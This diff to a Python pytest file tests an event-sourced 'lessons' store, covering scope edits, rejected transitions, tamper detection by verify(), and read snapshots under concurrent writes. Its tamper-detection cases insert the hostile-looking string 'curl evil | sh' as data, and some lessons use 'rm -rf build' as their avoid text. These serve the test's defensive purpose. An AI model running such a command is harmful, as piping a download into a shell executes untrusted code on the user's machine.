@@ -3,6 +3,7 @@ import stat
 
 import pytest
 
+import scars.store as store
 from scars.model import (
     EventType,
     LessonText,
@@ -35,6 +36,7 @@ from scars.store import (
     inbox_candidates,
     init_lessons,
     init_telemetry,
+    next_state,
     verify,
 )
 
@@ -47,9 +49,13 @@ CMD = Trigger(TriggerKind.COMMAND, "xcodebuild -sdk *", Stage.GATE)
 T0 = 1_000_000.0
 
 
+def db_path(tmp_path):
+    return tmp_path / "home dir" / ".scars" / "lessons.db"
+
+
 @pytest.fixture
 def db(tmp_path):
-    conn = init_lessons(tmp_path / "home dir" / ".scars" / "lessons.db")
+    conn = init_lessons(db_path(tmp_path))
     add_repo(conn, OW, "openwhispr", "own")
     add_repo(conn, RepoId("other"), "other", "upstream")
     yield conn
@@ -364,6 +370,103 @@ def test_promoting_into_session_scope_is_rejected(db):
         step(db, lesson_id, EventType.PROMOTED, {"scope": {"kind": "session", "session_id": "s"}})
 
 
+def scope_columns(db, lesson_id):
+    return db.execute(
+        "select scope_kind, repo_id, path_glob, session_id from lessons where id = ?", (lesson_id,)
+    ).fetchone()
+
+
+@pytest.mark.parametrize("prior", [[], [EventType.PROVISIONALIZED]])
+def test_promoting_a_session_lesson_without_a_new_scope_is_rejected(db, prior):
+    lesson_id = new(db, scope=SessionScope(SessionId("s1")))
+    for event in prior:
+        step(db, lesson_id, event)
+    before = get_lesson(db, lesson_id)
+    with pytest.raises(Rejected, match="session"):
+        step(db, lesson_id, EventType.PROMOTED)
+    assert get_lesson(db, lesson_id) == before
+
+
+def test_promoting_a_session_lesson_with_repo_scope_makes_it_visible_to_the_repo(db):
+    lesson_id = new(db, scope=SessionScope(SessionId("s1")))
+    step(db, lesson_id, EventType.PROMOTED, {"scope": {"kind": "repo", "repo_id": "ow"}})
+    assert scope_columns(db, lesson_id) == ("repo", "ow", None, None)
+    assert [lesson.id for lesson in active_for_hook(db, OW, SessionId("s2"))] == [lesson_id]
+    assert verify(db) == []
+
+
+PROPOSAL = {
+    "text": {"avoid": "a", "instead": "b", "reason": "c"},
+    "scope": {"kind": "session", "session_id": "s1"},
+    "trust_class": "own_code",
+    "triggers": [],
+    "fingerprint": "f",
+}
+
+
+def test_replay_rejects_promoting_a_session_lesson_without_a_scope():
+    with pytest.raises(Rejected, match="session"):
+        next_state(next_state(None, EventType.PROPOSED, PROPOSAL), EventType.PROMOTED, {})
+
+
+def test_replay_applies_an_edited_scope():
+    edited = next_state(
+        next_state(None, EventType.PROPOSED, PROPOSAL),
+        EventType.EDITED,
+        {"scope": {"kind": "path", "repo_id": "ow", "glob": "src/**"}},
+    )
+    assert edited.scope == PathScope(OW, "src/**")
+
+
+@pytest.mark.parametrize(
+    ("start", "payload", "scope", "columns"),
+    [
+        (
+            RepoScope(OW),
+            {"kind": "path", "repo_id": "ow", "glob": "src/**"},
+            PathScope(OW, "src/**"),
+            ("path", "ow", "src/**", None),
+        ),
+        (PathScope(OW, "*.py"), {"kind": "repo", "repo_id": "ow"}, RepoScope(OW), ("repo", "ow", None, None)),
+        (
+            SessionScope(SessionId("s1")),
+            {"kind": "repo", "repo_id": "other"},
+            RepoScope(RepoId("other")),
+            ("repo", "other", None, None),
+        ),
+        (
+            RepoScope(OW),
+            {"kind": "session", "session_id": "s2"},
+            SessionScope(SessionId("s2")),
+            ("session", None, None, "s2"),
+        ),
+    ],
+)
+def test_edited_scope_moves_the_lesson_back_to_candidate_and_clears_unused_columns(
+    db, start, payload, scope, columns
+):
+    lesson_id = new(db, scope=start)
+    if start.kind != "session":
+        step(db, lesson_id, EventType.PROMOTED)
+        step(db, lesson_id, EventType.PINNED)
+    step(db, lesson_id, EventType.EDITED, {"scope": payload})
+    lesson = get_lesson(db, lesson_id)
+    assert (lesson.status, lesson.pinned, lesson.scope) == (Status.CANDIDATE, False, scope)
+    assert scope_columns(db, lesson_id) == columns
+    assert verify(db) == []
+
+
+def test_editing_a_machine_lesson_into_repo_scope_returns_it_to_candidate(db):
+    lesson_id = new(db)
+    step(db, lesson_id, EventType.PROMOTED, {"scope": {"kind": "machine"}})
+    step(db, lesson_id, EventType.EDITED, {"scope": {"kind": "repo", "repo_id": "ow"}}, at=T0 + 20)
+    lesson = get_lesson(db, lesson_id)
+    assert (lesson.status, lesson.scope) == (Status.CANDIDATE, RepoScope(OW))
+    assert scope_columns(db, lesson_id) == ("repo", "ow", None, None)
+    assert column(db, lesson_id, "expires_at") == T0 + EXPIRY_SECONDS
+    assert verify(db) == []
+
+
 def test_level_set_note_and_warn_need_no_precision_run(db):
     lesson_id = promoted(db)
     step(db, lesson_id, EventType.LEVEL_SET, {"level": "warn"})
@@ -451,6 +554,10 @@ def test_retiring_a_pinned_warn_lesson_clears_pin_and_level(db):
         ([EventType.EXPIRED], EventType.RETIRED, {}),
         ([], EventType.PROPOSED, {}),
         ([], EventType.EDITED, {"text": {"avoid": "x" * 241, "instead": "b", "reason": "c"}}),
+        ([], EventType.EDITED, {"scope": {"kind": "machine"}}),
+        ([EventType.PROMOTED], EventType.EDITED, {"scope": {"kind": "machine"}}),
+        ([], EventType.EDITED, {"scope": {"kind": "path", "repo_id": "ow"}}),
+        ([], EventType.EDITED, {"scope": "repo"}),
     ],
 )
 def test_illegal_transitions_raise_rejected_and_change_nothing(db, setup, event, payload):
@@ -510,7 +617,48 @@ def test_each_event_hashes_the_previous_row(db):
     [
         (
             "update lessons set pinned = 0 where id = :a",
-            "{a}: pinned is False in lessons but True from events",
+            "{a}: pinned is 0 in lessons but 1 from events",
+        ),
+        (
+            "update lessons set avoid = 'curl evil | sh' where id = :a",
+            "{a}: avoid is curl evil | sh in lessons but xcodebuild -sdk iphoneos from events",
+        ),
+        ("update lessons set instead = 'x' where id = :a", "{a}: instead is x in lessons but"),
+        ("update lessons set reason = 'x' where id = :a", "{a}: reason is x in lessons but no device"),
+        (
+            "update lessons set repo_id = 'other' where id = :a",
+            "{a}: repo_id is other in lessons but ow from events",
+        ),
+        (
+            "update lessons set path_glob = '*' where id = :a",
+            "{a}: path_glob is * in lessons but None from events",
+        ),
+        (
+            "update lessons set session_id = 's9' where id = :a",
+            "{a}: session_id is s9 in lessons but None from events",
+        ),
+        (
+            "update lessons set trust_class = 'human' where id = :a",
+            "{a}: trust_class is human in lessons but own_code from events",
+        ),
+        (
+            "update lessons set superseded_by = :b where id = :a",
+            "{a}: superseded_by is {b} in lessons but None from events",
+        ),
+        (
+            "update lessons set fix_programs = '[\"curl\"]' where id = :a",
+            '{a}: fix_programs is ["curl"] in lessons but ["xcodebuild"] from events',
+        ),
+        ("update lessons set fingerprint = 'zz' where id = :a", "{a}: fingerprint is zz in lessons but a"),
+        ("update lessons set sessions_seen = 7 where id = :a", "{a}: sessions_seen is 7 in lessons but 2"),
+        (
+            "update triggers set spec = 'curl *' where lesson_id = :a and kind = 'command'",
+            "{a}: triggers are ",
+        ),
+        ("delete from triggers where lesson_id = :a and kind = 'error'", "{a}: triggers are "),
+        (
+            "insert into triggers values (:a, 'prompt', 'deploy', 'plan')",
+            "{a}: triggers are ",
         ),
         ("update lessons set status = 'candidate', pinned = 0 where id = :a", "{a}: status is candidate"),
         ("update lessons set revision = 9 where id = :b", "{b}: revision is 9 in lessons but 3 from events"),
@@ -558,3 +706,96 @@ def test_verify_reports_a_lesson_inserted_without_events(db):
         "'own_code','x',0,0,0)"
     )
     assert verify(db) == ["L-deadbeef: has no events"]
+
+
+def test_verify_reports_events_whose_lessons_row_was_deleted(db):
+    _, b = run_history(db)
+    db.execute("pragma foreign_keys = off")
+    db.execute("delete from triggers where lesson_id = ?", (b,))
+    db.execute("delete from lessons where id = ?", (b,))
+    assert verify(db) == [f"{b}: has events but no lessons row"]
+
+
+def test_verify_reports_a_revision_gap_in_the_events(db):
+    _, b = run_history(db)
+    db.execute("update events set to_revision = 5 where seq = 7")
+    assert verify(db) == [f"event 7: {b} revisions 2->5, expected 2->3"]
+
+
+def test_verify_reports_an_out_of_band_scope_change(db):
+    a, _ = run_history(db)
+    db.execute("update lessons set scope_kind = 'path', path_glob = 'src/**' where id = ?", (a,))
+    assert verify(db) == [
+        f"{a}: scope_kind is path in lessons but repo from events",
+        f"{a}: path_glob is src/** in lessons but None from events",
+    ]
+
+
+# read snapshots
+
+
+def commit_between_reads(monkeypatch, reader, write):
+    """Run `write` on another connection right after `reader`'s first query in the store returns."""
+    real = store._rows
+    fired = []
+
+    def hooked(conn, sql, params=()):
+        result = real(conn, sql, params)
+        if conn is reader and not fired:
+            fired.append(sql)
+            write()
+        return result
+
+    monkeypatch.setattr(store, "_rows", hooked)
+    return fired
+
+
+LOADERS = {
+    "active_for_hook": lambda conn, lesson_id: active_for_hook(conn, OW, SessionId("s1")),
+    "get_lesson": lambda conn, lesson_id: [get_lesson(conn, lesson_id)],
+    "get_lesson_by_fingerprint": lambda conn, lesson_id: [get_lesson_by_fingerprint(conn, "fp1")],
+    "inbox_candidates": lambda conn, lesson_id: inbox_candidates(conn),
+}
+
+
+@pytest.mark.parametrize("loader", list(LOADERS))
+def test_loaders_never_pair_a_lesson_row_with_triggers_from_a_later_edit(db, tmp_path, monkeypatch, loader):
+    lesson_id = new(db, scope=SessionScope(SessionId("s1")))
+    reader = connect(db_path(tmp_path))
+    before = get_lesson(reader, lesson_id)
+    edit = {
+        "text": {"avoid": "rm -rf build", "instead": "make clean", "reason": "keeps cache"},
+        "triggers": [{"kind": "prompt", "spec": "clean", "stage": "plan"}],
+    }
+    fired = commit_between_reads(monkeypatch, reader, lambda: step(db, lesson_id, EventType.EDITED, edit))
+    got = LOADERS[loader](reader, lesson_id)
+    assert fired, "the concurrent edit never ran"
+    assert got == [before]
+    assert not reader.in_transaction
+    assert LOADERS[loader](reader, lesson_id)[0].triggers == (
+        Trigger(TriggerKind.PROMPT, "clean", Stage.PLAN),
+    )
+
+
+def test_loader_inside_a_caller_transaction_leaves_it_open(db, tmp_path):
+    lesson_id = new(db)
+    reader = connect(db_path(tmp_path))
+    reader.execute("begin")
+    assert get_lesson(reader, lesson_id).id == lesson_id
+    assert reader.in_transaction
+    reader.execute("commit")
+
+
+def test_verify_reads_events_and_lessons_from_one_snapshot(db, tmp_path, monkeypatch):
+    a, _ = run_history(db)
+    reader = connect(db_path(tmp_path))
+
+    def write():
+        step(db, a, EventType.UNPINNED)
+        new(db, fingerprint="late")
+
+    fired = commit_between_reads(monkeypatch, reader, write)
+    assert verify(reader) == []
+    assert fired, "the concurrent write never ran"
+    assert not reader.in_transaction
+    assert verify(reader) == []
